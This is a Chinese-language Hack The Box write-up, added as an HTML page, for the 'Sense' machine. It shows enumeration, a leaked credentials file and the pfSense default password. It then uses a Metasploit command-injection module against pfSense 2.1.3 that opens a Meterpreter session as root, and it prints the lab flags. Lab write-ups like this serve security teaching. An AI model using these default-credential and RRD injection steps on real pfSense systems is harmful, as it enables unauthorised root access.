@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HTB Sense — 完整攻略</title>
+    <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600&family=Inter:wght@400;500;600;700&family=Noto+Sans+SC:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>:root{--bg:#0c0e12;--surface:#13161c;--surface-raised:#1a1e26;--border:#262b36;--text:#c8cdd6;--text-muted:#6b7280;--heading:#e8ecf2;--accent:#4ade80;--accent-dim:#166534;--red:#f87171;--amber:#fbbf24;--blue:#60a5fa;--purple:#c084fc;--cyan:#22d3ee;--code-bg:#0a0c10}*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Noto Sans SC','Inter',-apple-system,sans-serif;background:var(--bg);color:var(--text);line-height:1.8;-webkit-font-smoothing:antialiased}.hero{border-bottom:1px solid var(--border);padding:4rem 2rem 3rem;position:relative}.hero::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,var(--accent),var(--blue),var(--red))}.hero-inner{max-width:860px;margin:0 auto}.hero-label{font-family:'IBM Plex Mono',monospace;font-size:.75rem;letter-spacing:.12em;text-transform:uppercase;color:var(--accent);margin-bottom:1rem}.hero h1{font-size:2.8rem;font-weight:700;color:var(--heading);letter-spacing:-.03em}.hero h1 span{color:var(--accent)}.hero-meta{margin-top:1.2rem;display:flex;gap:2rem;flex-wrap:wrap;font-family:'IBM Plex Mono',monospace;font-size:.8rem;color:var(--text-muted)}.hero-meta strong{color:var(--text)}.chain{background:var(--surface);border-bottom:1px solid var(--border);padding:1.5rem 2rem;overflow-x:auto}.chain-inner{max-width:860px;margin:0 auto;display:flex;align-items:center;gap:0;white-space:nowrap;font-family:'IBM Plex Mono',monospace;font-size:.78rem}.chain-node{padding:.4rem .9rem;border-radius:4px;font-weight:500}.chain-node.green{background:var(--accent-dim);color:var(--accent)}.chain-node.red{background:#5f1e1e;color:var(--red)}.chain-arrow{color:var(--text-muted);padding:0 .5rem}.content{max-width:860px;margin:0 auto;padding:3rem 2rem 6rem}.phase{margin-top:3.5rem;margin-bottom:2rem;padding-bottom:.8rem;border-bottom:1px solid var(--border)}.phase:first-child{margin-top:0}.phase-number{font-family:'IBM Plex Mono',monospace;font-size:.7rem;letter-spacing:.15em;text-transform:uppercase;margin-bottom:.3rem}.phase-number.green{color:var(--accent)}.phase-number.red{color:var(--red)}.phase h2{font-size:1.6rem;font-weight:700;color:var(--heading)}h3{font-size:1.15rem;font-weight:600;color:var(--heading);margin-top:2.2rem;margin-bottom:.8rem}p{margin-bottom:1rem}pre{background:var(--code-bg);border:1px solid var(--border);border-radius:6px;padding:1.2rem 1.4rem;overflow-x:auto;margin:1rem 0 1.4rem;font-family:'IBM Plex Mono',monospace;font-size:.82rem;line-height:1.65;color:var(--text)}pre .comment{color:var(--text-muted)}pre .cmd{color:var(--accent)}pre .output{color:#8b949e}pre .highlight{color:var(--amber)}pre .important{color:var(--red)}code{font-family:'IBM Plex Mono',monospace;font-size:.88em;background:var(--surface-raised);padding:.15em .4em;border-radius:3px;color:var(--cyan)}pre code{background:none;padding:0;color:inherit}.callout{border-radius:6px;padding:1rem 1.2rem;margin:1.2rem 0;font-size:.92rem;line-height:1.6}.callout-why{background:#1a1e26;border-left:3px solid var(--blue)}.callout-why .callout-label{color:var(--blue)}.callout-key{background:#1a1220;border-left:3px solid var(--purple)}.callout-key .callout-label{color:var(--purple)}.callout-warn{background:#1e1a12;border-left:3px solid var(--amber)}.callout-warn .callout-label{color:var(--amber)}.callout-label{font-family:'IBM Plex Mono',monospace;font-size:.72rem;font-weight:600;letter-spacing:.1em;text-transform:uppercase;display:block;margin-bottom:.3rem}.takeaway{background:var(--surface);border:1px solid var(--border);border-radius:6px;padding:1.5rem;margin:2rem 0}.takeaway h3{margin-top:0}.takeaway-item{padding:.5rem 0;border-bottom:1px solid var(--border)}.takeaway-item:last-child{border-bottom:none}.takeaway-item strong{color:var(--heading)}.takeaway-item p{margin-bottom:0}.diagram{background:var(--surface);border:1px solid var(--border);border-radius:6px;padding:2rem;margin:1.5rem 0;text-align:center;font-family:'IBM Plex Mono',monospace;font-size:.82rem;line-height:2;color:var(--text);overflow-x:auto}.diagram .node{display:inline-block;padding:.3rem .8rem;border-radius:4px}.diagram .node-green{background:var(--accent-dim);color:var(--accent)}.diagram .node-red{background:#5f1e1e;color:var(--red)}.diagram .arrow{color:var(--text-muted);margin:0 .3rem}.footer{text-align:center;padding:2rem;font-family:'IBM Plex Mono',monospace;font-size:.75rem;color:var(--text-muted);border-top:1px solid var(--border);margin-top:4rem}@media(max-width:640px){.hero h1{font-size:1.8rem}.content{padding:2rem 1rem 4rem}pre{font-size:.75rem;padding:1rem}}</style>
+</head>
+<body>
+<div id="gate" style="position:fixed;inset:0;z-index:9999;background:var(--bg);display:flex;align-items:center;justify-content:center;"><div style="text-align:center;font-family:'IBM Plex Mono',monospace;"><div style="font-size:2.4rem;margin-bottom:.3rem;">🛡️</div><div style="font-size:.72rem;letter-spacing:.12em;text-transform:uppercase;color:var(--accent);margin-bottom:1.2rem;">HTB Writeup — Restricted</div><div style="color:var(--text-muted);font-size:.85rem;margin-bottom:1.5rem;max-width:320px;line-height:1.6;">This writeup contains spoilers for an HTB machine.<br>Enter the password to continue.</div><input id="gate-pw" type="password" placeholder="Password" autofocus style="background:var(--surface);border:1px solid var(--border);color:var(--heading);padding:.6rem 1rem;border-radius:4px;font-family:inherit;font-size:.9rem;width:220px;text-align:center;outline:none;" onkeydown="if(event.key==='Enter')checkPw()"><br><button onclick="checkPw()" style="margin-top:.8rem;background:var(--accent-dim);color:var(--accent);border:1px solid var(--accent);padding:.5rem 1.8rem;border-radius:4px;font-family:inherit;font-size:.82rem;cursor:pointer;">Enter</button><div id="gate-err" style="color:var(--red);font-size:.78rem;margin-top:.8rem;visibility:hidden;">Incorrect password</div><div style="color:var(--text-muted);font-size:.7rem;margin-top:2rem;opacity:.4;font-style:italic;direction:rtl;unicode-bidi:bidi-override;">Tessera est nomen machinae</div></div></div>
+<script>function checkPw(){if(document.getElementById('gate-pw').value==='sense'){document.getElementById('gate').style.display='none';sessionStorage.setItem('htb-auth-sense','1')}else{document.getElementById('gate-err').style.visibility='visible';document.getElementById('gate-pw').value=''}};if(sessionStorage.getItem('htb-auth-sense')==='1')document.getElementById('gate').style.display='none';</script>
+
+<header class="hero"><div class="hero-inner"><div class="hero-label">Hack The Box — 完整攻略</div><h1><span>Sense</span></h1><div class="hero-meta"><span>OS <strong>FreeBSD (pfSense)</strong></span><span>难度 <strong>Easy</strong></span><span>端口 <strong>80 · 443</strong></span><span>作者 <strong><a href="https://app.hackthebox.com/" style="color:var(--accent);text-decoration:none;">Nauhcnes</a></strong></span></div></div></header>
+
+<div class="chain"><div class="chain-inner"><span class="chain-node green">system-users.txt 泄露凭据 → pfSense 登录</span><span class="chain-arrow">→</span><span class="chain-node red">RRD 命令注入 → 直接 root（pfSense 默认 root 运行）</span></div></div>
+
+<main class="content">
+
+<p style="color:var(--text-muted);font-style:italic;margin-bottom:2rem;">🧒 一句话版：网站上贴了便签条写着用户名和「用公司默认密码」→ 登录防火墙 → 画图功能有后门 → 防火墙 = 保安队长 = 直接最高权限</p>
+
+<div class="phase"><div class="phase-number green">Phase 0</div><h2>信息收集</h2></div>
+
+<h3>Nmap</h3>
+<pre><code><span class="cmd">$ sudo nmap -sCV -p- -T4 10.129.47.41</span>
+<span class="output">PORT    STATE SERVICE    VERSION
+80/tcp  open  http       lighttpd 1.4.35
+|_http-title: Did not follow redirect to https://10.129.47.41/
+443/tcp open  ssl/https?</span></code></pre>
+
+<p>访问 HTTPS 看到 <strong>pfSense</strong> 登录页面。</p>
+
+<div class="callout callout-why">
+<span class="callout-label">🧒 什么是 pfSense？</span>
+pfSense 是基于 FreeBSD 的开源防火墙系统，名字来自 PF（Packet Filter）。简单说就是一台专门负责网络安全的「门卫电脑」，通过网页界面管理。支持 VPN、入侵检测、流量整形等企业级功能，广泛用于企业网络和家庭实验室。
+</div>
+
+<h3>目录枚举</h3>
+<pre><code><span class="comment"># pfSense 对不存在的路径统一返回 301 跳转，需要过滤</span>
+<span class="cmd">$ gobuster dir -u http://10.129.47.41 \
+  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
+  -x php,html,txt --exclude-length 178 -b 301,404</span>
+<span class="output"><span class="highlight">/system-users.txt</span></span></code></pre>
+
+<h3>system-users.txt — 凭据泄露</h3>
+<pre><code><span class="output">####Support ticket###
+
+Please create the following user
+
+username: <span class="highlight">Rohit</span>
+password: <span class="highlight">company defaults</span></span></code></pre>
+
+<div class="callout callout-key">
+<span class="callout-label">🧒 便签条又贴门口了</span>
+「company defaults」= pfSense 的默认密码 <code>pfsense</code>。用 <code>rohit</code> / <code>pfsense</code> 登录，确认版本为 <strong>pfSense 2.1.3-RELEASE</strong>。
+</div>
+
+
+<div class="phase"><div class="phase-number red">Phase 1</div><h2>立足点 + 提权 — 一步到 root</h2></div>
+
+<div class="callout callout-why">
+<span class="callout-label">🧒 为什么不需要提权？</span>
+pfSense 是防火墙系统，需要最高权限才能管理所有网络流量，所以默认以 <strong>root</strong> 身份运行。一旦拿到 shell 就直接是 root——就像偷到了保安队长的钥匙，直接就能进所有房间。
+</div>
+
+<h3>searchsploit</h3>
+<pre><code><span class="cmd">$ searchsploit pfsense 2.1.3</span>
+<span class="output">pfSense &lt; 2.1.4 - '<span class="highlight">status_rrd_graph_img.php</span>' Command Injection
+  → php/webapps/43560.py</span></code></pre>
+
+<h3>Metasploit 利用</h3>
+<pre><code><span class="cmd">msf6 > use exploit/unix/http/pfsense_graph_injection_exec
+msf6 > set USERNAME rohit
+msf6 > set PASSWORD pfsense
+msf6 > set RHOSTS 10.129.47.41
+msf6 > set LHOST 10.10.15.65
+msf6 > run</span>
+
+<span class="output">[*] Detected pfSense 2.1.3-RELEASE, uploading initial payload
+[*] Payload uploaded successfully, executing
+[+] Deleted mMSEJRN
+[*] Meterpreter session 1 opened</span>
+
+<span class="cmd">meterpreter > shell</span>
+<span class="output"># whoami
+<span class="highlight">root</span></span></code></pre>
+
+<h3>拿 Flag</h3>
+<pre><code><span class="cmd"># cat /home/rohit/user.txt</span>
+<span class="output">8721327cc232073b40d27d9c17e7348b</span>
+
+<span class="cmd"># cat /root/root.txt</span>
+<span class="output">d08c32a5d4f8c8b10e76eb51a69f1a86</span></code></pre>
+
+
+<div class="phase"><div class="phase-number" style="color:var(--purple);">附录</div><h2>知识点总结</h2></div>
+
+<div class="takeaway">
+<div class="takeaway-item"><strong>暴露的文本文件泄露凭据。</strong><p><code>system-users.txt</code> 直接写了用户名和「用默认密码」。目录枚举时永远别忘了扫 <code>.txt</code> 扩展名。</p></div>
+<div class="takeaway-item"><strong>「公司默认密码」= 产品出厂密码。</strong><p>pfSense 默认密码是 <code>pfsense</code>。遇到「company defaults」这种暗示，立即查对应产品的默认凭据。</p></div>
+<div class="takeaway-item"><strong>gobuster 扫 pfSense 必须过滤 301。</strong><p>pfSense 对所有不存在的路径返回 301 跳转（而不是 404），不过滤的话结果全是噪音。</p></div>
+<div class="takeaway-item"><strong>防火墙/网络设备默认 root 运行。</strong><p>pfSense、OPNsense、MikroTik 等防火墙系统需要 root 权限管理网络接口。打进去就是 root，不需要额外提权。</p></div>
+<div class="takeaway-item"><strong>pfSense 基于 FreeBSD，不是 Linux。</strong><p>部分 Linux 命令的输出格式可能不同。但 <code>cat</code>、<code>whoami</code> 等基础命令通用。</p></div>
+</div>
+
+<div class="diagram"><span class="node node-green">system-users.txt</span><span class="arrow">→</span><span class="node node-green">默认密码登录</span><span class="arrow">→</span><span class="node node-red">RRD 命令注入 → root</span></div>
+
+</main>
+<footer class="footer"><a href="https://app.hackthebox.com/" style="color:var(--accent);text-decoration:none;">Nauhcnes</a> · HTB Sense 攻略 · 2026</footer>
+</body></html>
